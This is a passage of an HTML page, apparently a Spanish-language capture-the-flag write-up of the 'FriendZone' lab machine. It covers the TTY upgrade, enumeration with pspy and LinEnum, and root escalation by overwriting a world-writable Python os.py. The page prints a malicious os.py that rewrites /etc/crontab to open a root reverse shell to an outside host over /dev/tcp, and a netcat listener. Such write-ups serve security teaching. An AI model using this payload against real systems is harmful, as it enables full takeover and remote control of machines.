+      <p>Tenemos shell como <code>www-data</code>. Hacemos el tratamiento de TTY y leemos la flag de usuario:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body">$ <span class="c-cmd">python -c "import pty; pty.spawn('/bin/bash')"</span>
+www-data@FriendZone:/$ <span class="c-cmd">cat /home/friend/user.txt</span></div>
+      </div>
+    </div>
+
+    <!-- PRIVESC -->
+    <div class="writeup-section reveal" id="privesc">
+      <div class="section-label">fase 4</div>
+      <h2>Escalada de <em>privilegios</em></h2>
+
+      <h3>Enumeración con pspy</h3>
+      <p>Subimos <a href="https://github.com/dominicbreuker/pspy" target="_blank" rel="noopener" style="color:var(--accent)">pspy64</a> vía el mismo recurso SMB escribible y lo copiamos a <code>/tmp</code>:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body">www-data@FriendZone:/tmp$ <span class="c-cmd">cp /etc/Development/pspy64s .</span>
+www-data@FriendZone:/tmp$ <span class="c-cmd">./pspy64s</span>
+
+<span class="c-key">CMD: UID=0 PID=2192 | /usr/bin/python /opt/server_admin/reporter.py</span>
+<span class="c-key">CMD: UID=0 PID=2191 | /bin/sh -c /opt/server_admin/reporter.py</span></div>
+      </div>
+
+      <p>Un script Python se ejecuta periódicamente como <code>root</code>. Al revisar el código de <code>reporter.py</code> no encontramos nada explotable directamente — pero importa el módulo estándar <code>os</code>.</p>
+
+      <h3>LinEnum — permisos de escritura</h3>
+      <p>Ejecutamos <code>LinEnum.sh</code> de la misma forma, buscando archivos escribibles por cualquier usuario:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body">www-data@FriendZone:/tmp$ <span class="c-cmd">./LinEnum.sh -t 1</span>
+
+[-] World-writable files (excluding /proc and /sys):
+-rwxrwxrwx 1 root root 25910 Jan 15 2019 <span class="c-key">/usr/lib/python2.7/os.py</span></div>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">💀 Python Module Hijacking</div>
+        <p>El módulo <code>os.py</code> de la librería estándar de Python 2.7 tiene permisos <code>777</code> — cualquier usuario puede sobrescribirlo. Como <code>reporter.py</code> se ejecuta como <code>root</code> y hace <code>import os</code>, si reemplazamos ese archivo, nuestro código se ejecutará con privilegios de root la próxima vez que el cron dispare el script.</p>
+      </div>
+
+      <h3>Explotación: sobreescritura de os.py</h3>
+      <p>Creamos un <code>os.py</code> malicioso que, al ser importado, añade una entrada al <code>crontab</code> que nos envía una reverse shell como root:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">python</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-tag">shell</span> = <span class="c-str">'\n* * * * * root /bin/bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.39/4445 0&gt;&amp;1"\n'</span>
+f = <span class="c-cmd">open</span>(<span class="c-str">'/etc/crontab'</span>, <span class="c-str">'w'</span>)
+f.write(shell)
+f.close()</div>
+      </div>
+
+      <p>Lo subimos a través del recurso SMB <code>Development</code> y lo copiamos a la ubicación del módulo, reemplazando el original:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body">www-data@FriendZone:/tmp$ <span class="c-cmd">cp /etc/Development/os.py /usr/lib/python2.7/os.py</span>
+
+<span class="c-comment"># nos ponemos en escucha en otro puerto</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">nc -nlvp 4445</span></div>
+      </div>
+
+      <p>En menos de un minuto, el cron ejecuta <code>reporter.py</code> como root, este hace <code>import os</code>, ejecuta nuestro código malicioso, sobreescribe <code>/etc/crontab</code> y la siguiente ejecución del cron nos envía una shell como <code>root</code>. Flag en <code>/root/root.txt</code>.</p>
+    </div>
+
+    <!-- LECCIONES -->
+    <div class="writeup-section reveal" id="lessons">
+      <div class="section-label">takeaways</div>
+      <h2>Lecciones <em>aprendidas</em></h2>
+
+      <div class="lessons-list">
+        <div class="lesson-item">
+          <div class="lesson-num">01</div>
+          <div class="lesson-body">
+            <div class="lesson-title">Las transferencias de zona DNS (AXFR) revelan infraestructura interna</div>
+            <div class="lesson-desc">Siempre que veas el puerto 53 abierto y conozcas un dominio (por ejemplo, en un certificado SSL), prueba <code>dig axfr dominio @ip</code>. Un servidor mal configurado puede revelar subdominios y vhosts que de otra forma serían invisibles.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">02</div>
+          <div class="lesson-body">
+            <div class="lesson-title">Los comentarios de SMB revelan rutas del sistema de archivos</div>
+            <div class="lesson-desc">El comentario <code>"FriendZone Samba Server Files /etc/Files"</code> en <code>enum4linux</code> nos dijo dónde estaban montados los shares. Razonar por analogía (<code>Files</code> → <code>/etc/Files</code>, entonces <code>Development</code> → <code>/etc/Development</code>) fue la clave para encadenar el SMB con el LFI.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">03</div>
+          <div class="lesson-body">
+            <div class="lesson-title">Un LFI + un recurso de escritura = RCE</div>
+            <div class="lesson-desc">Por sí solo, un LFI solo lee archivos existentes. Pero si además puedes escribir un archivo en cualquier ruta accesible por el servidor (vía SMB, FTP, upload, etc.), el LFI se convierte en ejecución remota de código.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">04</div>
+          <div class="lesson-body">
+            <div class="lesson-title">Module hijacking en Python 2: revisa permisos de /usr/lib/python2.7/</div>
+            <div class="lesson-desc">Si un script que corre como root importa módulos estándar (<code>os</code>, <code>sys</code>, etc.) y esos módulos tienen permisos de escritura para tu usuario, puedes sobrescribirlos para ejecutar código arbitrario con privilegios elevados. Herramientas como pspy son esenciales para detectar qué se ejecuta como root y cuándo.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <div class="footer-logo">{ fl<em>0</em> } — © 2026</div>
+  <div class="footer-copy">built with &lt;3 · pentesting & sysadmin</div>
+</footer>
+
+<script>
+  // ── CURSOR ──
+  const cur  = document.getElementById('cursor');
+  const ring = document.getElementById('cursor-ring');
+  document.addEventListener('mousemove', e => {
+    cur.style.left = e.clientX + 'px';
+    cur.style.top  = e.clientY + 'px';
+    setTimeout(() => {
+      ring.style.left = e.clientX + 'px';
+      ring.style.top  = e.clientY + 'px';
+    }, 80);
+  });
+
+  // ── DARK MODE ──
+  function toggleTheme() {
+    const isDark = document.body.classList.toggle('dark');
+    document.getElementById('toggle-icon').textContent  = isDark ? '☀️' : '🌙';
+    document.getElementById('toggle-label').textContent = isDark ? 'light' : 'dark';
+    localStorage.setItem('theme', isDark ? 'dark' : 'light');
+  }
+  if (localStorage.getItem('theme') === 'dark') {
+    document.body.classList.add('dark');
+    document.getElementById('toggle-icon').textContent  = '☀️';
+    document.getElementById('toggle-label').textContent = 'light';
+  }
+
+  // ── COPY CODE ──
+  function copyCode(btn) {
+    const text = btn.closest('.code-block').querySelector('.code-body').innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copiado ✓';
+      setTimeout(() => btn.textContent = 'copiar', 2000);
+    });
+  }
+
+  // ── REVEAL ON SCROLL ──
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); } });
+  }, { threshold: 0.08 });
+  document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
+</script>
+</body>
+</html>
